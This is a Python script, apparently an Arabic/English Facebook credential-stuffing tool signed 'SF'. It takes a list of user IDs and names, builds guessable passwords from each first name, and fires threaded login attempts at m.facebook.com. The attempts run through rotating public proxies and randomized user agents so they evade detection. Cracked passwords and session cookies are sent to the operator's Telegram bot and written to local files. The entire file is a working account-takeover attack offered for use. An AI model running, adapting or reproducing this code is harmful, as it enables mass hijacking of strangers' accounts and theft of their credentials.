import os
try:
    import requests
except:
    os.system("pip install requests")
try:
    import rich
except:
    os.system("pip install rich")
try:
    import bs4
except:
    os.system("pip install bs4")
import os, sys, time, requests, json, random, datetime, re, rich,bs4
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
console = Console()
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.columns import Columns as col
from rich import pretty
def zone(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.005)
while True:
    TOKEN = input('\x1b[1;97m ├──➤ \033[33mToken \x1b[1;97m: \x1b[1;92m')
    if len(TOKEN) >= 46:
        os.system("clear")
        break
    else:
        os.system("clear")
        zone("ENTER YOUR TOKEN CORRECTLY | ادخل التوكن بشكل صحيح ")
while True:
    ID = input('\x1b[1;97m ├──➤ \033[33mId \x1b[1;97m: \x1b[1;92m')
    if len(ID) >= 9:
        os.system("clear")
        break
    else:
        os.system("clear")
        zone("ENTER YOUR ID CORRECTLY | ادخل الايدي بشكل صحيح ")
        

pretty.install()
CON = sol()
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []
while True:
    try:
        prox = requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
        open('.PROXZ.txt', 'w').write(prox)
        break
    except Exception as e:
        zone("wait for internet......")
        time.sleep(1)
while True:
    try:
        prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
        open('.PROXZ.txt', 'w').write(prox)
        break
    except Exception as e:
        zone("wait for internet......")
        time.sleep(1)
while True:
    try:
        prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt').text
        open('.PROXZ.txt', 'w').write(prox)
        break
    except Exception as e:
        zone("wait for internet......")
        time.sleep(1)

prox=open('.PROXZ.txt','r').read().splitlines()
for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(['6','7','8','9','10','11','12'])
    c = ' en-us; GT-'
    d = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(10):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'
    ugen2.append(uaku)
def uaku():
    try:
        ua=open('.PROXZ.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
        ua=open('.PROXZ.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('.PROXZ.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss=[]
pwnya=[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
asu = random.choice([m,k,h,u,b])
dic = {'1': 'January','2': 'February','3': 'March','4': 'April','5': 'May','6': 'June','7': 'July','8': 'August','9': 'September','10': 'October','11': 'November','12': 'December' }
dic2 ={'1': 'January','2': 'February','3': 'March','4': 'April','5': 'May','6': 'June','7': 'July','8': 'August','9': 'September','10': 'October','11': 'November','12': 'December' }
def clear():
    os.system('clear')

def banner():
    K=(''' \x1b[1;35m░██████╗███████╗
██╔════╝██╔════╝
╚█████╗░█████╗░░
░╚═══██╗██╔══╝░░
██████╔╝██║░░░░░
╚═════╝░╚═╝░░░░░''')
    zone(K)
    zone("—"*60)
def menu():
    File()
def File():
    try:
        os.system('clear')
        banner()
        jum = input('FILE PATH:')
        for line in open(jum, 'r').readlines():
            id.append(line.strip())
        setting()
    except requests.exceptions.ConnectionError:
            zone('NO CONNECTION | انترنت ضعيف')
            str()
    except (KeyError,IOError):
            zone('FILE NOT FOUND | لم يعثر على الملف')
            time.sleep(1.5)
            menu()
            

def setting():
    os.system('clear')
    hu = "3"
    if hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        str()
        clear()
    hc = "1"
    if hc in ['1','01']:
        method.append('mobile')
        clear()
    pwplus="1"
    if pwplus in ['y','Y']:
        pwpluss.append('ya')
        pwku=input(' \x1b[38;5;98mAutoPassword [ Y/n ] = ')
        pwkuh=pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
    passwrd()
        
def passwrd():
    with tred(max_workers=50) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(frs) == 3 and len(frs) == 4 and len(frs) == 5 and len(frs) == 6 and len(frs) == 7 and len(frs) == 8 and len(frs) == 9 and len(frs) == 10 and len(frs) == 11 or len(frs) == 12:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(nmf)
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
                    pwv.append(frs + '123456')
                    pwv.append(frs + '1234567')
                    pwv.append(frs + '12345678')
                    pwv.append(frs + '123456789')
                    pwv.append(frs + '1234567890')
                    pwv.append(frs + '1122')
                    pwv.append(frs + '1212')
                    pwv.append(frs + '123321')
                    pwv.append(frs + '123123')
                    pwv.append(frs + '1221')
                    pwv.append(frs + '1986')
                    pwv.append(frs + '1987')
                    pwv.append(frs + '1988')
                    pwv.append(frs + '1989')
                    pwv.append(frs + '1990')
                    pwv.append(frs + '1991')
                    pwv.append(frs + '1992')
                    pwv.append('22446688')
                    pwv.append('07500750')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
                    pwv.append(frs + '123456')
                    pwv.append(frs + '1234567')
                    pwv.append(frs + '12345678')
                    pwv.append(frs + '123456789')
                    pwv.append(frs + '1234567890')
                    pwv.append(frs + '1122')
                    pwv.append(frs + '1212')
                    pwv.append(frs + '123321')
                    pwv.append(frs + '123123')
                    pwv.append(frs + '1221')
                    pwv.append(frs + '1986')
                    pwv.append(frs + '1987')
                    pwv.append(frs + '1988')
                    pwv.append(frs + '1989')
                    pwv.append(frs + '1990')
                    pwv.append(frs + '1991')
                    pwv.append(frs + '1992')
                    pwv.append('22446688')
                    pwv.append('07500750')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            else:
                pool.submit(crack,idf,pwv)
    zone(' OK : %s ' % ok)
    zone(' CP : %s ' % cp)
    str()
def crack(idf,pwv):
    global cp, ok, loop
    bo = random.choice([u,k,kk,b,h,hh])
    sys.stdout.write(f'\r \x1b[1;97m[ \x1b[1;97m<⏤͟͞SF 🇮🇶> \x1b[1;37m] \x1b[1;37m(\x1b[1;92mOK\x1b[1;30m-\x1b[1;93mCP\x1b[1;37m) \x1b[1;37m(\x1b[1;32m{ok}\x1b[1;30m-\x1b[1;33m{cp}\x1b[1;37m)\x1b[1;30m =\x1b[1;37m {loop}  ')
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                cpc=(f'[CP]\nID:{idf} \nPASS:{pw} \n[COOKIES]:{kuki} | \nUseragent:{ua}\nDEV: @s1l0k')
                table = Table(title="Good Facebook", style="green")
                table.add_column("Failed", style="red", no_wrap=True)
                table.add_column("Value", style="yellow")
                table.add_row("Email ➜ \n—————————————————————————", idf+"\n—————————————————————————")
                table.add_row("Pass ➜ \n—————————————————————————", pw+"\n—————————————————————————")
                table.add_row("User-Agent ➜ \n—————————————————————————\nHello my friend Good Luck\nThis tool made by SF 🎲\nMy User: @SF7SF0 on telegram", ua+"\n—————————————————————————")
                footer_text = Text("Dev: <⏤͟͞SF 🇮🇶> | @SF7SF0 ", style="blue")
                panel = Panel.fit(table, title="[CP]", subtitle=footer_text, border_style="red")
                console.print(panel)
                requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={cpc}')
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
                cp+=1
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                okc=(f'[OK]\nID:{idf} \nPASS:{pw} \n[COOKIES]:{kuki} | \nUseragent:{ua}\nDEV: @s1l0k')
                table = Table(title="Good Facebook", style="green")
                table.add_column("Successfully", style="cyan", no_wrap=True)
                table.add_column("Value", style="magenta")
                table.add_row("Email ➜ \n—————————————————————————", idf+"\n—————————————————————————")
                table.add_row("Pass ➜ \n—————————————————————————", pw+"\n—————————————————————————")
                table.add_row("User-Agent ➜ \n—————————————————————————\nHello my friend Good Luck\nThis tool made by SF 🎲\nMy User: @SF7SF0 on telegram", ua+"\n—————————————————————————")
                footer_text = Text("Dev: <⏤͟͞SF  🇮🇶> | @SF7SF0 ", style="bold blue")
                panel = Panel.fit(table, title="[Ok]", subtitle=footer_text, border_style="bright_yellow")
                console.print(panel)
                requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={okc}')
                open('/storage/emulated/0/<⏤͟͞SF 🇮🇶>-OK/' + okc, 'a').write(idf + '|' + pw + '\n')
            else:
                ';'.join
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
if __name__ == '__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    menu()